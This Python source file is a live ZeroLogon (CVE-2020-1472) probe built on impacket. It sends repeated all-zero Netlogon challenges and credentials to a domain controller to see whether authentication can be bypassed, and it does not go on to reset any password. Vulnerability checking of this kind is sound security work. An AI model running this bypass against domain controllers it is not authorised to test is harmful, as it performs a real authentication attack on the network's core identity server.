from __future__ import annotations

from dataclasses import dataclass


@dataclass
class ZerologonProbeResult:
    host: str
    vulnerable: bool | None = None
    attempts: int = 0
    error: str | None = None


def probe_zerologon(
    host: str,
    *,
    dc_name: str | None = None,
    max_attempts: int = 2000,
) -> ZerologonProbeResult:
    """Live ZeroLogon check (CVE-2020-1472) — destructive if vulnerable."""
    result = ZerologonProbeResult(host=host)
    server_name = (dc_name or host).split(".")[0]

    try:
        from impacket.dcerpc.v5 import epm, nrpc, transport
        from impacket.dcerpc.v5.dtypes import NULL
    except ImportError:
        result.error = "impacket not installed"
        return result

    try:
        binding = epm.hept_map(host, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
        dce = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)

        for attempt in range(max_attempts):
            result.attempts = attempt + 1
            nrpc.hNetrServerReqChallenge(dce, NULL, server_name + "\x00", b"\x00" * 8)
            try:
                nrpc.hNetrServerAuthenticate3(
                    dce,
                    NULL,
                    server_name + "$\x00",
                    nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                    server_name + "\x00",
                    b"\x00" * 8,
                    0x212FFFF,
                )
            except nrpc.DCERPCSessionError as exc:
                if exc.get_error_code() == 0xC0000022:
                    continue
                result.vulnerable = False
                result.error = f"unexpected DC error: 0x{exc.get_error_code():08x}"
                return result
            else:
                result.vulnerable = True
                return result

        result.vulnerable = False
    except Exception as exc:
        result.error = str(exc)
    return result
